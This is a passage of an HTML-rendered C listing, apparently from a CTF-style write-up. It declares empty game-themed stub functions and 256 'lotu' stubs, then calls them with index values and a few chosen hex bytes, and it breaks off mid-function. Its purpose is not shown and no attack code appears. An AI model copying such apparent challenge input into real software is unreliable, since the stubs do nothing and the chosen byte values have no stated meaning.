class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line">void fight(long <span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void merge(<span class="built_in">int</span> a,<span class="built_in">int</span> b)&#123;&#125;//a=a+b</span><br><span class="line">void destroy(<span class="built_in">int</span> a)&#123;&#125;;//a=<span class="number">0</span></span><br><span class="line">void upgrade(<span class="built_in">int</span> a)&#123;&#125;;//every+=a</span><br><span class="line">void wuxiangdeyidao()&#123;&#125;;</span><br><span class="line">void zhanjinniuza()&#123;&#125;;</span><br><span class="line">void guobapenhuo()&#123;&#125;;</span><br><span class="line">void tiandongwanxiang()&#123;&#125;;</span><br><span class="line">void lotu(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu1(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu2(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu3(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu4(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu5(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu6(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu7(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu8(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu9(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu10(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu11(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu12(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu13(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu14(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu15(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu16(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu17(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu18(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu19(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu20(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu21(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu22(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu23(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu24(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu25(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu26(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu27(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu28(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu29(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu30(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu31(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu32(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu33(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu34(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu35(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu36(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu37(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu38(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu39(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu40(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu41(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu42(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu43(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu44(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu45(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu46(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu47(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu48(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu49(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu50(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu51(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu52(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu53(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu54(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu55(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu56(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu57(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu58(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu59(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu60(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu61(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu62(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu63(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu64(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu65(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu66(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu67(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu68(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu69(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu70(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu71(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu72(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu73(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu74(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu75(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu76(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu77(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu78(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu79(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu80(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu81(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu82(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu83(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu84(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu85(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu86(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu87(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu88(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu89(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu90(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu91(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu92(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu93(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu94(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu95(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu96(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu97(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu98(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu99(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu100(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu101(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu102(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu103(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu104(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu105(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu106(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu107(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu108(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu109(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu110(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu111(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu112(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu113(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu114(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu115(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu116(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu117(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu118(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu119(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu120(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu121(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu122(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu123(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu124(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu125(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu126(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu127(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu128(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu129(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu130(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu131(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu132(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu133(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu134(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu135(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu136(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu137(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu138(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu139(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu140(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu141(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu142(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu143(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu144(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu145(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu146(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu147(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu148(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu149(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu150(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu151(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu152(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu153(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu154(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu155(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu156(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu157(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu158(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu159(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu160(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu161(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu162(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu163(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu164(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu165(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu166(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu167(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu168(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu169(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu170(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu171(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu172(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu173(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu174(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu175(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu176(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu177(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu178(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu179(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu180(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu181(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu182(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu183(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu184(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu185(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu186(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu187(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu188(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu189(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu190(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu191(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu192(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu193(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu194(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu195(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu196(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu197(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu198(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu199(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu200(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu201(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu202(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu203(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu204(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu205(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu206(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu207(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu208(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu209(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu210(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu211(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu212(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu213(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu214(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu215(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu216(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu217(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu218(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu219(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu220(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu221(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu222(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu223(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu224(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu225(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu226(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu227(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu228(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu229(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu230(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu231(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu232(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu233(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu234(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu235(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu236(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu237(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu238(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu239(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu240(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu241(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu242(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu243(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu244(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu245(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu246(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu247(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu248(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu249(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu250(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu251(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu252(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu253(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu254(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line">void lotu255(<span class="built_in">int</span> a)&#123;&#125;;</span><br><span class="line"></span><br><span class="line">void gamestart()</span><br><span class="line">&#123;</span><br><span class="line">    lotu(<span class="number">0</span>);</span><br><span class="line">    lotu1(<span class="number">1</span>);</span><br><span class="line">    lotu2(<span class="number">2</span>);</span><br><span class="line">    lotu3(<span class="number">3</span>);</span><br><span class="line">    lotu4(<span class="number">4</span>);</span><br><span class="line">    lotu5(<span class="number">5</span>);</span><br><span class="line">    lotu6(<span class="number">6</span>);</span><br><span class="line">    lotu7(<span class="number">7</span>);</span><br><span class="line">    lotu8(<span class="number">0x6e</span>);</span><br><span class="line">    lotu9(<span class="number">9</span>);</span><br><span class="line">    lotu10(<span class="number">10</span>);</span><br><span class="line">    lotu11(<span class="number">11</span>);</span><br><span class="line">    lotu12(<span class="number">12</span>);</span><br><span class="line">    lotu13(<span class="number">13</span>);</span><br><span class="line">    lotu14(<span class="number">14</span>);</span><br><span class="line">    lotu15(<span class="number">15</span>);</span><br><span class="line">    lotu16(<span class="number">16</span>);</span><br><span class="line">    lotu17(<span class="number">17</span>);</span><br><span class="line">    lotu18(<span class="number">18</span>);</span><br><span class="line">    lotu19(<span class="number">19</span>);</span><br><span class="line">    lotu20(<span class="number">20</span>);</span><br><span class="line">    lotu21(<span class="number">21</span>);</span><br><span class="line">    lotu22(<span class="number">22</span>);</span><br><span class="line">    lotu23(<span class="number">23</span>);</span><br><span class="line">    lotu24(<span class="number">24</span>);</span><br><span class="line">    lotu25(<span class="number">25</span>);</span><br><span class="line">    lotu26(<span class="number">26</span>);</span><br><span class="line">    lotu27(<span class="number">27</span>);</span><br><span class="line">    lotu28(<span class="number">28</span>);</span><br><span class="line">    lotu29(<span class="number">29</span>);</span><br><span class="line">    lotu30(<span class="number">30</span>);</span><br><span class="line">    lotu31(<span class="number">31</span>);</span><br><span class="line">    lotu32(<span class="number">32</span>);</span><br><span class="line">    lotu33(<span class="number">33</span>);</span><br><span class="line">    lotu34(<span class="number">34</span>);</span><br><span class="line">    lotu35(<span class="number">35</span>);</span><br><span class="line">    lotu36(<span class="number">36</span>);</span><br><span class="line">    lotu37(<span class="number">37</span>);</span><br><span class="line">    lotu38(<span class="number">38</span>);</span><br><span class="line">    lotu39(<span class="number">39</span>);</span><br><span class="line">    lotu40(<span class="number">40</span>);</span><br><span class="line">    lotu41(<span class="number">41</span>);</span><br><span class="line">    lotu42(<span class="number">42</span>);</span><br><span class="line">    lotu43(<span class="number">43</span>);</span><br><span class="line">    lotu44(<span class="number">44</span>);</span><br><span class="line">    lotu45(<span class="number">45</span>);</span><br><span class="line">    lotu46(<span class="number">46</span>);</span><br><span class="line">    lotu47(<span class="number">47</span>);</span><br><span class="line">    lotu48(<span class="number">48</span>);</span><br><span class="line">    lotu49(<span class="number">49</span>);</span><br><span class="line">    lotu50(<span class="number">50</span>);</span><br><span class="line">    lotu51(<span class="number">51</span>);</span><br><span class="line">    lotu52(<span class="number">52</span>);</span><br><span class="line">    lotu53(<span class="number">53</span>);</span><br><span class="line">    lotu54(<span class="number">54</span>);</span><br><span class="line">    lotu55(<span class="number">55</span>);</span><br><span class="line">    lotu56(<span class="number">56</span>);</span><br><span class="line">    lotu57(<span class="number">57</span>);</span><br><span class="line">    lotu58(<span class="number">58</span>);</span><br><span class="line">    lotu59(<span class="number">59</span>);</span><br><span class="line">    lotu60(<span class="number">60</span>);</span><br><span class="line">    lotu61(<span class="number">61</span>);</span><br><span class="line">    lotu62(<span class="number">62</span>);</span><br><span class="line">    lotu63(<span class="number">63</span>);</span><br><span class="line">    lotu64(<span class="number">64</span>);</span><br><span class="line">    lotu65(<span class="number">65</span>);</span><br><span class="line">    lotu66(<span class="number">66</span>);</span><br><span class="line">    lotu67(<span class="number">67</span>);</span><br><span class="line">    lotu68(<span class="number">68</span>);</span><br><span class="line">    lotu69(<span class="number">69</span>);</span><br><span class="line">    lotu70(<span class="number">70</span>);</span><br><span class="line">    lotu71(<span class="number">71</span>);</span><br><span class="line">    lotu72(<span class="number">72</span>);</span><br><span class="line">    lotu73(<span class="number">73</span>);</span><br><span class="line">    lotu74(<span class="number">74</span>);</span><br><span class="line">    lotu75(<span class="number">75</span>);</span><br><span class="line">    lotu76(<span class="number">76</span>);</span><br><span class="line">    lotu77(<span class="number">77</span>);</span><br><span class="line">    lotu78(<span class="number">0xad</span>);</span><br><span class="line">    lotu79(<span class="number">0xfd</span>);</span><br><span class="line">    lotu80(<span class="number">0</span>);</span><br><span class="line">    lotu81(<span class="number">0</span>);</span><br><span class="line">    lotu82(<span class="number">0</span>);</span><br><span class="line">    lotu83(<span class="number">0</span>);</span><br><span class="line">    lotu84(<span class="number">0</span>);</span><br><span class="line">    lotu85(<span class="number">0xcd</span>);</span><br><span class="line">    lotu86(<span class="number">86</span>);</span><br><span class="line">    lotu87(<span class="number">87</span>);</span><br><span class="line">    lotu88(<span class="number">88</span>);</span><br><span class="line">    lotu89(<span class="number">89</span>);</span><br><span class="line">    lotu90(<span class="number">90</span>);</span><br><span class="line">    lotu91(<span class="number">91</span>);</span><br><span class="line">    lotu92(<span class="number">92</span>);</span><br><span class="line">    lotu93(<span class="number">93</span>);</span><br><span class="line">    lotu94(<span class="number">94</span>);</span><br><span class="line">    lotu95(<span class="number">95</span>);</span><br><span class="line">    lotu96(<span class="number">96</span>);</span><br><span class="line">    lotu97(<span class="number">97</span>);</span><br><span class="line">    lotu98(<span class="number">98</span>);</span><br><span class="line">    lotu99(<span class="number">99</span>);</span><br><span class="line">    lotu100(<span class="number">100</span>);</span><br><span class="line">    lotu101(<span class="number">101</span>);</span><br><span class="line">    lotu102(<span class="number">102</span>);</span><br><span class="line">    lotu103(<span class="number">103</span>);</span><br><span class="line">    lotu104(<span class="number">104</span>);</span><br><span class="line">    lotu105(<span class="number">105</span>);</span><br><span class="line">    lotu106(<span class="number">106</span>);</span><br><span class="line">    lotu107(<span class="number">107</span>);</span><br><span class="line">    lotu108(<span class="number">108</span>);</span><br><span class="line">    lotu109(<span class="number">109</span>);</span><br><span class="line">    lotu110(<span class="number">110</span>);</span><br><span class="line">    lotu111(<span class="number">111</span>);</span><br><span class="line">    lotu112(<span class="number">112</span>);</span><br><span class="line">    lotu113(<span class="number">113</span>);</span><br><span class="line">    lotu114(<span class="number">114</span>);</span><br><span class="line">    lotu115(<span class="number">115</span>);</span><br><span class="line">    lotu116(<span class="number">116</span>);</span><br><span class="line">    lotu117(<span class="number">117</span>);</span><br><span class="line">    lotu118(<span class="number">118</span>);</span><br><span class="line">    lotu119(<span class="number">119</span>);</span><br><span class="line">    lotu120(<span class="number">120</span>);</span><br><span class="line">    lotu121(<span class="number">121</span>);</span><br><span class="line">    lotu122(<span class="number">122</span>);</span><br><span class="line">    lotu123(<span class="number">123</span>);</span><br><span class="line">    lotu124(<span class="number">124</span>);</span><br><span class="line">    lotu125(<span class="number">125</span>);</span><br><span class="line">    lotu126(<span class="number">126</span>);</span><br><span class="line">    lotu127(<span class="number">127</span>);</span><br><span class="line">    lotu128(<span class="number">128</span>);</span><br><span class="line">    lotu129(<span class="number">129</span>);</span><br><span class="line">    lotu130(<span class="number">130</span>);</span><br><span class="line">    lotu131(<span class="number">131</span>);</span><br><span class="line">    lotu132(<span class="number">132</span>);</span><br><span class="line">    lotu133(<span class="number">133</span>);</span><br><span class="line">    lotu134(<span class="number">134</span>);</span><br><span class="line">    lotu135(<span class="number">135</span>);</span><br><span class="line">    lotu136(<span class="number">136</span>);</span><br><span class="line">    lotu137(<span class="number">137</span>);</span><br><span class="line">    lotu138(<span class="number">138</span>);</span><br><span class="line">    lotu139(<span class="number">139</span>);</span><br><span class="line">    lotu140(<span class="number">140</span>);</span><br><span class="line">    lotu141(<span class="number">141</span>);</span><br><span class="line">    lotu142(<span class="number">142</span>);</span><br><span class="line">    lotu143(<span class="number">143</span>);</span><br><span class="line">    lotu144(<span class="number">144</span>);</span><br><span class="line">    lotu145(<span class="number">145</span>);</span><br><span class="line">    lotu146(<span class="number">146</span>);</span><br><span class="line">    lotu147(<span class="number">147</span>);</span><br><span class="line">    lotu148(<span class="number">148</span>);</span><br><span class="line">    lotu149(<span class="number">149</span>);</span><br><span class="line">    lotu150(<span class="number">150</span>);</span><br><span class="line">    lotu151(<span class="number">151</span>);</span><br><span class="line">    lotu152(<span class="number">152</span>);</span><br><span class="line">    